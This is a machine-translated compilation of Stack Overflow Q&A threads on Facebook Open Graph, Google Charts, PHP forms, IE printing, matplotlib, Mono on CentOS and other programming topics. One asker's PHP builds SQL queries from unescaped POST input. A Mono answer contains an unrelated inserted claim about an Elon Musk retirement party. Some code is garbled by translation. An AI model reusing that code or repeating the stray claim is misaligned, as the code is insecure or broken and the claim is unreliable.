动作和对象类型都可以在[http://developers.facebook.com](http://developers.facebook.com)上定义。如果/当您有一个应用程序，并且您选择使用 Open Graph，它会鼓励您创建至少一种操作和一种对象类型。有许多预定义的（“读书”、“烹饪食谱”、“观看视频”等）。动作和对象可帮助您个性化发布到人们墙上的消息。

值得注意的是，如果您定义了自定义操作，Facebook 需要先批准它，然后他们才愿意让任何人使用它。通常这不是很困难......您只需单击操作旁边的“提交”按钮，它会告诉您是否/何时获得批准。

* * *

所以现在我们已经了解了基础知识，让我们谈谈如何在你的页面上实现这样的东西。我相信您很清楚，Open Graph 使用 FB.api() 而不是 FB.ui()。我将在这里使用 Javascript 示例。

```
 FB.api(
    '/me/app_namespace:share',
    'post',
    {
       pet_who_needs_a_home: document.location.href,
       image: pet_image // optional
    },
    function(response) {
      // You can do something with the response here.
      // If successful, Facebook returns the post id of the post it just made
      // If it fails, check response.error
    }
  ); 
```

<head> 标签中还需要两个非常重要的标签。他们在这里：

```
<meta property="fb:app_id" content="YOUR_APP_ID" />
<meta property="og:type" content="APP_NAMESPACE:pet_who_needs_a_home" /> 
```

现在让我告诉你一切是什么。FB.api() 相当明显，所以我会跳到...

```
'/me/app_namespace:share', 
```

/me 正在发布到你的墙上。app_namespace 是在 developers.facebook.com 上的应用详细信息部分中找到的命名空间。您可能需要定义一个命名空间（设置->基本->第二个文本框）。“：”打破了命名空间和动作。分享是行动（再次在developers.facebook.com 上定义）。

```
'post', 
```

告诉 Facebook 我们要使用 POST 请求（而不是 GET 请求）。

```
{
   pet_who_needs_a_home: document.location.href,
   image: pet_image // optional
}, 
```

这是（显然）两个重要值的 javascript 数组。“pet_who_needs_a_home”是（实际上是我的......你应该用你的任何东西替换它）对象类型（仍然在developers.facebook.com上），正如你所记得的那样，它可以帮助我们定义使用的语言，如上图所示。图像是一个可选字段，您可以在其中定义将通过打开图形共享的图像。您可以查看大量其他可选字段……您知道。

```
function(response) { 
```

......所有这些都是显而易见的，所以我将在那里省略无意义的细节。正如我在评论中提到的，如果成功，它会返回帖子的帖子 ID，或者返回可能是或可能不是描述性的错误（在 response.error 中找到）。

我希望元标签不言自明。YOUR_APP_ID 是……你猜对了……你的应用 ID。都是数字。app_namespace 再次是您的命名空间。pet_who_needs_a_home 是（我的）对象，应该用您碰巧使用的任何对象替换。

* * *

对不起，很长的帖子。希望那种清除了一点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-17T10:12:53.483

这将通过您的 appName 发布与 weForPresident 完全相同的帖子。请相应地更改您的消息。并且访问令牌应该具有 publish_actions 扩展权限

```
$attachment =  array(
                          'access_token' => $access_token,
                          'message' => "I Just Join WeForPresident",
                          'name' => "WeForPresident",
                          'description' => "philippe harewood just started gamng the election on weForPresident and could possibly win some cool stuff",
                          'link' => "any link to external site",
                          'picture' => "image link to display in left box"
                      );

   $facebook->api("me/feed","POST",$attachment); 
```

希望能帮助到你。

更新：上述解决方案的 javascript 对话框将如下所示，它将提示用户发布，因此不需要 publish_actions 扩展权限：

```
<html xmlns='http://www.w3.org/1999/xhtml'
            xmlns:fb='https://www.facebook.com/2008/fbml'>
            <head>
              <title>My Feed Dialog Page</title>
            </head>
            <body>
              <div id='fb-root'></div>
              <script src='http://connect.facebook.net/en_US/all.js'></script>
              <p id='msg'></p>
              <script>
                FB.init({appId: '#############', status: true, cookie: true});

                  // calling the API ...
                  var obj = {
                    method: 'feed',
                    link: 'any external url',
                    picture: 'picture url to show up in left',
                    name: 'name of the post: comes as heading in blue color within box',
                    description: 'post description, that comes within box'

                    };

                  function callback(response) {

                  }

                  FB.ui(obj, callback);

              </script>
            </body>
          </html>"; 
```

**此类帖子的完整代码：首先从**[https://github.com/facebook/facebook-php-sdk](https://github.com/facebook/facebook-php-sdk)下载 php-sdk

```
<?php
include_once "facebook-sdk/facebook.php"; 
$facebook = new Facebook(array(
          'appId' => APP_ID,
          'secret' => APP_SECRET,
        ));
if(isset($_GET['code']))
            {

                 $access_token = $facebook->getAccessTokenFromCode($_GET['code'],$_SESSION['redirect_uri']);

                $facebook->setAccessToken($access_token);
         $attachment =  array(
                          'access_token' => $access_token,
                          'message' => "$message",
                          'name' => "$name",
                          'description' => "$description",
                          'link' => "any external link",
                          'picture' => "picture url"
                      );

        $facebook->api("me/feed","POST",$attachment);
       }
         else
         {

            $scope = "publish_stream";
            $params = array('scope' => $scope);
            $loginUrl = $facebook->getLoginUrl($params);
            echo("<script> top.location.href='" . $loginUrl . "'</script>");

         }
?> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-21T16:46:23.547

这最终成为一个未修复且当前状态为“分类”的错误

[http://developers.facebook.com/bugs/138798476259001](http://developers.facebook.com/bugs/138798476259001)

到目前为止唯一的解决方案似乎是添加动作参数

# javascript - 谷歌图表不适用于 jquery 按钮功能

> ID：11782089
> 
> 赞同：0
> 
> 时间：2012-08-02T16:44:21.853
> 
> 标签：javascript, jquery, ajax, button, google-visualization

正如您在下面看到的，我创建了函数 getChart(); 它在自己调用时有效，但在我将其包装到 $(document).ready(function(){...}); 时不显示图表；我还附上了文件..任何帮助都受到高度重视和赞赏..thanx..

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <title>Google Visualization API Sample</title>
  <script type="text/javascript" src="http://www.google.com/jsapi"></script>
  <script type="text/javascript" src="jquery.js"></script>
  <script type="text/javascript">

    function getChart(){
    google.load('visualization', '1', {packages: ['corechart']});
    function drawVisualization() {
       // Populate the data table.

        var dataTable = google.visualization.arrayToDataTable([
           ['Mon', 20, 28, 38, 45],
           ['Fri', 68, 66, 22, 15]
        // Treat first row as data as well.
        ], true);   

        // Draw the chart.
        var chart = new     google.visualization.CandlestickChart(document.getElementById('visualization'));
        chart.draw(dataTable, {legend:'none', width:600, height:400});
    }

    google.setOnLoadCallback(drawVisualization);

    }

    $(document).ready(function(){
        $('#idbutton').click(function(){
            getChart();
        });
    });

  </script>
</head>
<body>
<input id="idbutton" type="button" value="button" />
<div id="visualization"></div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T20:00:01.807

尝试将其附加到窗口对象。就像是

```
$(document).ready(function(){
    window.getChart = function() { //Code of getChart here };
}); 
```

并调用它：

```
$(document).ready(function(){
    $('#idbutton').click(function(){
        window.getChart();
    });
}); 
```

注意：我没有测试它。

# php - 使用 PHP 变量填充文本字段

> ID：11782091
> 
> 赞同：1
> 
> 时间：2012-08-02T16:44:24.090
> 
> 标签：php, javascript

提交表单后，我在表单元素中保留值。我已经使用以下方法在选择框上正常工作：

```
<select name="BranchManager" class="formfield" id="BranchManager"onchange="document.forms[0].submit();SEinit();"><option value="">-- Select Manager --</option>
         <?php
            $area = $_POST['Area'];
            if ($area); {

               $BMquery = "SELECT DISTINCT Branch_Manager FROM Sales_Execs WHERE AREA = '$area' ".
               "ORDER BY Branch_Manager";

               $BMresult = mysql_query($BMquery);

               while($row = mysql_fetch_array($BMresult))
               {
                  echo "<option value=\"".$row['Branch_Manager']."\">".$row['Branch_Manager']."</option>\n  ";
               }
            }

        $branchmanager = $POST['BranchManager'];
        ?>

       <script type="text/javascript">
document.getElementById('BranchManager').value = <?php echo json_encode(trim($_POST['BranchManager']));?>;
</script> 
```

哪个很好用（抱歉，如果它不是最干净/最有效的代码，我会尽力而为！）下一个字段是一个文本字段，需要根据上面的分公司经理名称进行填充。所以我用过：

```
<input name="BranchNum" type="text" class="formfield" id="BranchNum" size="3" maxlength="3" />
                      <?php

                $bm = $_POST['BranchManager'];

                if ($bm); {

                $BNumquery = "SELECT DISTINCT BRANCH_NUM FROM Sales_Execs WHERE Branch_Manager = '$bm' ";

                $BNumresult = mysql_query($BNumquery);

                }

            $branchnum = $POST['BranchNum'];
            ?>

   <script type="text/javascript">
document.getElementById('BranchNum').value = <?php echo json_encode($BNumresult);?>;
</script> 
```

哪个不起作用...我在哪里出错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:51:37.420

您需要 mydql_fetch 函数从 $result 检索数据。

```
if($row = mysql_fetch_array($BNumresult))
    $branchNum = $row[BRANCH_NUM]; 
```

当您的输入标签大小为 3 时，为什么要使用 json_encode？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T16:59:38.903

为什么在 if 条件检查之后有分号？

```
if ($bm);

if ($area); 
```

这将始终终止语句，并且无论 $bm 或 $area 中的值如何，花括号中的任何内容都将始终执行

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-02T16:46:34.483

您需要将 value="<? echo $variableName; ?>" 放入输入字段中

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-02T16:47:55.103

原因是因为a）你没有选择`echo`，b）你必须`echo`在不同的地方而不是在选择中。您必须在`value`输入的部分中回显。

```
<?php
    $bm = mysql_real_escape_string($_POST['BranchManager']);
    if ($bm) {
        $BNumquery = "SELECT DISTINCT BRANCH_NUM FROM Sales_Execs WHERE Branch_Manager = '$bm' ";
        $BNumresult = mysql_query($BNumquery);
    }
    $branchnum = $POST['BranchNum'];
?>
<input name="BranchNum" 
    type="text" 
    class="formfield" 
    id="BranchNum" 
    size="3" 
    maxlength="3" 
    value="<?php echo htmlspecialchars($branchnum); ?>" /> 
```

根据评论，它们是正确的；你不应该使用`mysql_*`. 相反，看看[PDO](http://php.net/manual/en/book.pdo.php)；尽管这超出了您的问题范围。

# javascript - Window.print 在 IE 中不起作用

> ID：11782092
> 
> 赞同：7
> 
> 时间：2012-08-02T16:44:28.787
> 
> 标签：javascript, internet-explorer, printing, document

我必须通过以下方式打印出`div`我正在做的事情：

```
function PrintElem(elem)
    {
        Popup(elem.html());
    }

    function Popup(data) 
    {
        var mywindow = window.open('', 'to print', 'height=600,width=800');
        mywindow.document.write('<html><head><title></title>');
        mywindow.document.write('<link rel="stylesheet" href="css/mycss.css" type="text/css" />');
        mywindow.document.write('</head><body >');
        mywindow.document.write(data);
        mywindow.document.write('</body></html>');

        mywindow.print();
        mywindow.close();

        return true;
    } 
```

我的问题是在 IE 上，当我单击按钮时没有任何反应。但是，在 Chrome 和 Firefox 上它可以工作。我该怎么做才能正确打印出来？

**编辑：**我`print`通过以下方式致电：

```
$('#print_it').click(function(){
    var element = $('#itinerario');
    PrintElem(element);
}); 
```

这是`print_it`按钮的 id。

我看到的另一件事是，一段时间后，Chrome 和其他浏览器告诉我页面没有响应。为什么会这样？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T16:53:29.957

你必须做 a`mywindow.document.close()`并且你**不能在窗口名称中有空格**

我假设您从某事物的 onclick 调用 PrintElem - 如果该事物是一个链接，您需要在 onclick 处理程序中返回 false ！

如果我不得不这样做，我会这样做

```
function PrintElem(elem) { 
    Popup($(elem).html());
}

function Popup(data) 
{
    var mywindow = window.open('', 'to_print', 'height=600,width=800');
    var html = '<html><head><title></title>'+
               '<link rel="stylesheet" href="css/mycss.css" type="text/css" />'+
               '</head><body onload="window.focus(); window.print(); window.close()">'+
               data+
               '</body></html>';
    mywindow.document.write(html);
    mywindow.document.close();
    return true;
} 
```

但我不确定 window.close() 是否会干扰打印

那么为何不

```
$(function() {
  $('#print_it').click(function(){
    popup($('#itinerario').html());
  });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T18:15:05.467

我看到您已经使用 mplungjan 关于窗口名称中没有空格的注释解决了它，但另一种方法是粗略地使用@media print css 样式：

```
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title></title>
    <style type="text/css">
        @media print {
            * {
                visibility: hidden;
            }

            .printMe {
                visibility: visible;
            }
        }
    </style>
    <script type="text/javascript" src="jquery-1.4.4.js"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            $("#Button1").click(function () {
                var divToPrint = $("#div3");
                $(divToPrint).addClass("printMe");
                window.print();
                $(divToPrint).removeClass("printMe");
            }
            )
        }
        );
    </script>
</head>
<body>
    <div id="div1">fhgjghajghhjagjdag</div>
    <div id="div2">ytiyrtiyertuyeyiyt</div>
    <div id="div3">We want to print this one.</div>
    <div id="div4">vnbcxbvmzxbvc,xbv</div>
    <div id="buttonContainer">
        <input id="Button1" type="button" value="button" />
    </div>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-03T12:15:29.740

就我而言，我只需要使用以下代码：

```
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-12T20:01:20.083

在我的情况下，这个问题是通过在打印之前做一个焦点来解决的。

窗口.焦点（）；窗口.打印（）；

# .net - NServiceBus IBus 对象

> ID：11782093
> 
> 赞同：2
> 
> 时间：2012-08-02T16:44:29.920
> 
> 标签：.net, nservicebus

我相信我做了一个愚蠢的假设，即 IBus 对象将在整个应用程序中加载并且它是引用的程序集。

例如，如果我要在引用的程序集中执行以下操作：

```
public IBus Bus {get;set;} 
```

我是否正确地说这个对象只会加载到实现 NServiceBus 类的类上，例如 IHandleMessages 和 IWantToBeLoadedAtStartup？

任何有关细节的帮助或澄清都会很棒。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:49:49.987

你指的是依赖注入。NServiceBus 只会将`IBus`实例注入到由 NServiceBus 管理的对象中。

例如，NServiceBus 创建一个实现`IHandleMessages`传输消息时的类实例，并使用 Dependency Injection 容器注入总线客户端的实例。

[您可以扩展依赖注入机制，如此处](http://docs.particular.net/nservicebus/containers)所示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T04:47:57.937

如果您使用另一个容器而不是默认容器，则该容器将自动连接总线 IBus 实例，该实例由 NSB 容器抽象提供。无需在其他地方注册。它可以在任何地方注射。

# python - Matplotlib：在对数图中绘制垂直箭头

> ID：11782094
> 
> 赞同：10
> 
> 时间：2012-08-02T16:44:30.193
> 
> 标签：python, matplotlib

我无法在以下对数图中绘制一个简单的垂直箭头：

```
#!/usr/bin/python2

import matplotlib.pyplot as plt
import matplotlib as mpl

plt.yscale('log')
plt.xscale('log')
plt.ylim((1e-20,1e-10))
plt.xlim((1e-12,1))

plt.arrow(0.00006666, 1e-20, 0, 1e-8 - 1e-20, length_includes_head=True)

plt.savefig('test.pdf') 
```

它只是没有显示。从文档看来，所有参数（如宽度、高度等）似乎都与轴的比例有关。这是非常违反直觉的。我尝试使用`twin()`axisartist 包在我的顶部定义一个带限制的轴`(0,1)`，`(0,1)`以更好地控制箭头的参数，但我无法弄清楚如何在主轴之上拥有一个完全独立的轴。

有任何想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-06-14T21:12:06.953

我一直在寻找这个问题的答案，并找到了一个有用的答案！您可以指定任何“数学文本”字符（matplotlib 的 LaTeX 版本）作为标记。试试： plt.plot(x,y, 'ko', marker=r'$\downarrow$', markersize=20)

这将在位置 (x,y) 处绘制一个向下指向的黑色箭头，该箭头在任何绘图（甚至对数对数）上看起来都不错。有关您可以使用的更多符号，请参阅：matplotlib.org/users/mathtext.html#mathtext-tutorial。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-02T17:20:06.213

**子图方法**

创建子图后，请执行以下操作

*   对齐位置
*   用于`set_axis_off()`关闭轴（刻度、标签等）
*   画箭头！

所以几行得到你想要的！

例如

```
#!/usr/bin/python2

import matplotlib.pyplot as plt

hax = plt.subplot(1,2,1)
plt.yscale('log')
plt.xscale('log')
plt.ylim((1e-20,1e-10))
plt.xlim((1e-12,1))

hax2 = plt.subplot(1,2,2)
plt.arrow(0.1, 1, 0, 1, length_includes_head=True)

hax.set_position([0.1, 0.1, 0.8, 0.8])
hax2.set_position([0.1, 0.1, 0.8, 0.8])

hax2.set_axis_off()

plt.savefig('test.pdf') 
```

**重新调整数据**

或者，尽管轴标签可能很棘手，但一种可能更简单的方法是重新调整数据。

IE

```
import numpy 

# Other import commands and data input

plt.plot(numpy.log10(x), numpy.log10(y))) 
```

不是一个很好的解决方案，但如果您可以处理刻度标签，则效果不错！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-09-28T17:18:57.533

我知道这个线程已经死了很长时间了，但我认为发布我的解决方案可能对任何试图弄清楚如何有效地在对数刻度图上绘制箭头的人有所帮助。

作为其他人已经发布的替代方案，您可以使用[转换对象](http://matplotlib.org/users/transforms_tutorial.html#transforms-tutorial)来输入箭头坐标，而不是原始轴的比例，而是“轴坐标”的（线性）比例。我所说的轴坐标是通过 [0,1]（垂直范围）归一化为 [0,1]（水平范围）的坐标，其中点 (0,0) 是左下角，点(1,1) 将是右上角，依此类推。然后你可以简单地包括一个箭头：

```
plt.arrow(0.1, 0.1, 0.9, 0.9, transform=plot1.transAxes, length_includes_head=True) 
```

这给出了一个对角线跨越绘图水平和垂直范围的 4/5 的箭头，从左下角到右上角（`plot1`子图名称在哪里）。

如果您想在一般情况下执行此操作，可以为箭头指定精确坐标`(x0,y0)`和对数空间，如果您编写两个函数并将原始坐标转换为这些“轴”坐标`(x1,y1)`，这并不难。我已经给出了一个示例，说明如何可以修改 OP 发布的原始代码以在下面实现这一点（抱歉不包括代码生成的图像，我还没有所需的声誉）。`fx(x)``fy(y)`

```
#!/usr/bin/python3

import numpy as np
import matplotlib.pyplot as plt
import matplotlib as mpl

# functions fx and fy take log-scale coordinates to 'axes' coordinates
ax = 1E-12 # [ax,bx] is range of horizontal axis 
bx = 1E0
def fx(x):
    return (np.log(x) - np.log(ax))/(np.log(bx) - np.log(ax))

ay = 1E-20 # [ay,by] is range of vertical axis
by = 1E-10
def fy(y):
    return (np.log(y) - np.log(ay))/(np.log(by) - np.log(ay))

plot1 = plt.subplot(111)
plt.xscale('log')
plt.yscale('log')
plt.xlim(ax, bx)
plt.ylim(ay, by)

# transformed coordinates for arrow from (1E-10,1E-18) to (1E-4,1E-16)
x0 = fx(1E-10)
y0 = fy(1E-18)
x1 = fx(1E-4) - fx(1E-10)
y1 = fy(1E-16) - fy(1E-18)

plt.arrow(
          x0, y0, x1, y1, # input transformed arrow coordinates 
          transform = plot1.transAxes, # tell matplotlib to use axes coordinates   
          facecolor = 'black',
          length_includes_head=True
         )

plt.grid(True)
plt.savefig('test.pdf') 
```

# mono - 在 Centos 6 上安装最新的单声道

> ID：11782096
> 
> 赞同：10
> 
> 时间：2012-08-02T16:44:37.817
> 
> 标签：mono, installation, centos, centos6

我是 Linux 新手（字面意思是新 - 使用过几次），我尝试通过 yum 安装单声道；但我得到了一个不支持 .NET 4 的过时版本

如何安装单声道 2.10.8？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-02-27T02:37:05.140

好吧，这就是我想出的，它对我有用：

基于[这篇](http://jmainguy.com/index.php/installing-mono-3-0-1-on-centos-linux-6-3/)文章：

```
$yum install bison gettext glib2 freetype fontconfig libpng libpng-devel libX11 libX11-devel glib2-devel libgdi* libexif glibc-devel urw-fonts java unzip gcc gcc-c++ automake autoconf libtool make bzip2 wget

$cd /usr/local/src 

$wget http://download.mono-project.com/sources/mono/mono-3.0.1.tar.bz2

$tar jxf mono-3.0.1.tar.bz2

$cd mono-3.0.1

$./configure --prefix=/opt/mono

$make && make install 
```

然后我下载了`MonoDevelop`IDE 并使用 Mono 框架编译了我的程序。

然后在 Centos 中，我调用了我的程序：

`/opt/mono/bin/mono /root/MyFolder/MyProgramDir/myProgram.exe "$@"`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-17T07:09:04.043

这是 CentOS 6.5 上的 Hello World 控制台应用程序，使用 Mono“mcs”命令编译并使用 Mono“mono”命令运行。第一部分直接取自安德鲁的回答。为安德鲁+1！我添加了一些额外的步骤，因为我使用的是命令行，而不是 Linux GUI。

```
yum install bison gettext glib2 freetype fontconfig libpng libpng-devel libX11 libX11-devel glib2-devel libgdi* libexif glibc-devel urw-fonts java unzip gcc gcc-c++ automake autoconf libtool make bzip2 wget

cd /usr/local/src 

wget http://download.mono-project.com/sources/mono/mono-3.0.1.tar.bz2

tar jxf mono-3.0.1.tar.bz2

cd mono-3.0.1

./configure --prefix=/opt/mono

make && make install 
```

**将 mono bin 添加到“PATH”环境变量：**

```
[root@localhost bin]# echo $PATH
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin
[root@localhost bin]# export PATH=/opt/mono/bin:$PATH
[root@localhost bin]# echo $PATH
/opt/mono/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin
[root@localhost bin]# 
```

**程序.cs：**

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HelloWorld
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello Mars!");
        }
    }
} 
```

**编译并运行：**

[![在此处输入图像描述](../Images/e2b27f56be7d4a115442ef40d714912e.png)](https://i.stack.imgur.com/dadTF.png)

> 埃隆马斯克的退休派对计划在 2025 年 12 月 16 日举行！

**编译 *.sln 文件：**

[![在此处输入图像描述](../Images/0067668bfa84881f8465926148c475a3.png)](https://i.stack.imgur.com/YEufq.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T12:26:28.337

在 CentOS 5 下，最好从源代码编译 Mono 以获得最新版本。

碰巧我已经在这里写了一套完整的说明（如果你能原谅我链接到我自己的一个页面）：

[http://wiki.phonicuk.com/Installing-Mono-in-CentOS-5-x.ashx](http://wiki.phonicuk.com/Installing-Mono-in-CentOS-5-x.ashx)

编辑：

上面的链接已经失效，最好的说明现在在[http://www.mono-project.com/docs/compiling-mono/compiling-from-git/](http://www.mono-project.com/docs/compiling-mono/compiling-from-git/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T16:59:11.123

在 Fedora/RedHat 世界中，Mono 封装一直是需要爱的，所以如果你使用的是 CentOS，那就去想想吧。

Mono 的下载页面列出了 OpenSUSE、Debian 和 Ubuntu：[http ://www.go-mono.com/mono-downloads/download.html](http://www.go-mono.com/mono-downloads/download.html)

如果你想做一些严肃的事情，我会使用其中一个选项，否则你只能靠自己了。

[（Novell 曾经在这里](http://wiki.phonicuk.com/Installing-Mono-in-CentOS-5-x.ashx)提供来自 CentOS 的预构建软件包，但现在那里的所有链接似乎都已损坏。此外，这些似乎是“企业”版本，无论如何，如果您使用 CentOS 而不是 RH，那么您已经避免了这种情况我猜是次世界……）

# node.js - 使用 node.js 和 monogjs 的动态集合

> ID：11782097
> 
> 赞同：3
> 
> 时间：2012-08-02T16:44:42.680
> 
> 标签：node.js, mongodb, dynamic, mongojs

我试图找到一种将 vars 用于 mongojs 集合的方法。数据是动态的，也是 db.VAR.find(); 必须是动态的。有没有解决这个问题的方法。我在这里和谷歌搜索，但什么都没有。我希望你能帮助我。

例子：

```
var var1 = "game12"; var var2 = "game34";

db.***var1***.find({name: x},function(err, datas) {
     if( err || !datas ) {
        console.log("Problem finding data :" + err);
     }else{
         datas.forEach( function(curData) {
            console.log(curData);
         });
     } });

db.***var2***.find({name: x},function(err, datas) {
     if( err || !datas ) {
        console.log("Problem finding data :" + err);
     }else{
         datas.forEach( function(curData) {
            console.log(curData);
         });
     } }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:48:17.083

`db[var1].find(...`

`db[var2].find(...`

# wordpress - 无法为我的博客设置 facebook 开放图形协议

> ID：11782099
> 
> 赞同：0
> 
> 时间：2012-08-02T16:44:42.953
> 
> 标签：wordpress, facebook-opengraph

我的 wordpress 博客的 Facebook Open Graph 实施存在问题。尽管所有的 og 元数据都在脑海中，但 Facebook 调试工具告诉我：**Error Parsing URL : Error parsing input URL, no data was scraped。** 我已经做过的事情：

*   检查链接错误
*   试试 Yoast 的 Wordpress SEO 插件，Facebook Open Graph impementation
*   试试 WP Facebook Open Graph Protocol 插件
*   将我的头文件中的所有og元标记一一删除并手动放置以发现错误

这些技巧都没有奏效，所有这些技巧都以[Facebook 调试工具](https://developers.facebook.com/tools/debug/og/object?q=sfapress.uphero.com)结束，告诉我：**解析 URL 时出错：解析输入 URL 时出错，没有数据被抓取。** 但我发现[谷歌网站管理员工具](http://www.google.com/webmasters/tools/richsnippets?url=http://sfapress.uphero.com)可以看到我的标签和关于我博客的信息。如果您在[sfapress.uphero.com](http://sfapress.uphero.com)上查看源代码，您会看到 og 元标记在它们预期的位置。

所以，我只是想知道：我错过了什么？我对此有多大的错误？你们中的任何人都可以帮我解决这个问题吗？感谢帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:33:42.757

您的托管服务提供商或您的网络服务器似乎拒绝访问 Facebook 抓取工具。这就是为什么它说没有数据被抓取。查看[https://developers.facebook.com/docs/opengraphprotocol/#bestpractices](https://developers.facebook.com/docs/opengraphprotocol/#bestpractices)和[https://developers.facebook.com/docs/ApplicationSecurity/#facebook_scraper](https://developers.facebook.com/docs/ApplicationSecurity/#facebook_scraper)以了解刮板如何出现在 Web 服务器上的信息。

# php - 将个人信息安全地存储在网上商店

> ID：11782100
> 
> 赞同：1
> 
> 时间：2012-08-02T16:44:49.233
> 
> 标签：php, encryption, e-commerce

目前我正在为客户建立一个在线商店（使用 OpenCart）。所有的支付和交易都是通过支付网关（PayPal 等）进行的，因此网站从不存储支付信息（银行详细信息、卡号等）。

但是，我的客户仍然担心客户个人信息（地址、出生日期、全名等）的安全。我向他解释过，使用 SSL，客户端和服务器之间传输的任何数据都是加密的，服务器上的个人信息不加密是正常的（我指出即使是像索尼这样大的公司也不加密） .

显然，加密 MySQL 的内容是完全可能的，但当然您仍然需要将密钥放在服务器上。如果有人进入服务器，他们也会得到密钥并简单地解密数据库内容。

那么，在更安全地存储个人信息方面，我还能做些什么吗？有没有我遗漏的“行业技术”。我认为行业标准是以纯文本形式存储个人信息的想法是否正确？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:12:41.570

即使您没有严格要求，也请尝试为您的方案实现 PCI 合规性。这将使您的客户高枕无忧，并要求您遵循一些行业最佳实践。您还必须做的一件事是扫描您的服务器——这将为您的服务器安全建立一些基本的信心。

PCI 合规性并不能保证安全。它基本上是在你的门上锁上锁并确保窗户是关闭的。

**PCI 合规性没有也无法检查的最重要的事情是*您的 web 应用程序本身*是否易受攻击。**如果您的应用程序中某处（例如）存在 SQL 注入攻击向量，那么*即使*您加密整个数据库并将其锁定在地下保险库中，您的数据也可能被盗。[因此，获得试图攻击它](http://mdsec.net/wahh/tasks.html)的应用程序的自动测试覆盖率。定期运行这些测试。

一些关于 PCI 合规性的随机谷歌搜索指南：

*   [PCI合规级别](http://resource.onlinetech.com/guide-to-pci-compliance-levels-merchant-types/)
*   [PCI 检查表和扫描仪](http://www.1stoppciscan.com/pci-compliance-checklist/)
*   [官方 PCI 常见问题解答](http://www.pcicomplianceguide.org/pcifaqs.php)

非常小心地注意：**如果您的网络服务器在任何阶段甚至*接触*卡数据，您都*需要*符合 PCI 标准。** 仅仅因为您不*存储*CC 数据并不意味着 PCI 合规性不适用。合规级别将不那么严格，但仍会有合规级别。

我不清楚 PCI 合规性是否适用于您的场景。基本上，如果客户直接将卡号输入*贝宝的*网站，而您永远不知道卡号，则您不需要符合 PCI。但是，如果他们将卡号输入*您的*网站，并且您的服务器通过 API 将该数据传递给 Paypal，那么*即使您没有存储他们输入的数据，您**也*需要符合 PCI 标准！

# android - MapView 气球到 DetailView

> ID：11782102
> 
> 赞同：1
> 
> 时间：2012-08-02T16:44:53.103
> 
> 标签：android, google-maps, android-mapview, itemizedoverlay

在我的 MapView 中显示了这样的气球：http://www.codemobiles.com/forum/code-mobile-topic-4180.html（它或多或少相同的代码）我想要什么：如果我按气球1 它应该用 1 的信息打开详细视图，当我按下气球 2 它应该用 2 的信息打开详细视图

我将此添加到逐项叠加： c.startActivity(new Intent(c.getApplicationContext(), QuoteDetail.class));

因此，当我按下 Balloon 1 时，它会打开带有 Information 1 的 DetailView 但是当我按下 Balloon 2 时，它也会打开带有 Information 1 的 DetailView 我该如何更改？

这是我的代码： QuoteDetail:

```
private ImageView mImageView;
private TextView mQuote;
private TextView mInfo;
private TextView mEmail;
private TextView mTel;
private TextView mWww;
private int mPosition;
private DataSource mDataSource;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.quote_detail);

    Intent i = getIntent();
    mPosition = i.getIntExtra("position", 0);

    mDataSource = new DataSource();
    mImageView = (ImageView) findViewById(R.detail.image);
    mQuote = (TextView) findViewById(R.detail.quote);
    mInfo = (TextView) findViewById(R.detail.info);
    mEmail = (TextView) findViewById(R.detail.email);
    mTel = (TextView) findViewById(R.detail.tel);
    mWww = (TextView) findViewById(R.detail.www);

    mImageView.setImageResource(mDataSource.getmPhotoHdPool().get(mPosition));
    mQuote.setText(getResources().getString(mDataSource.getmQuotePool().get(mPosition)));
    mInfo.setText(getResources().getString(mDataSource.getmInfoPool().get(mPosition)));
    mEmail.setText(getResources().getString(mDataSource.getmEmailPool().get(mPosition)));
    mTel.setText(getResources().getString(mDataSource.getmTelPool().get(mPosition)));
    mWww.setText(getResources().getString(mDataSource.getmWwwPool().get(mPosition)));
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
   getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;  }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.menu_me:  startActivity(new Intent(this, AboutmeActivity.class));;
                                break;

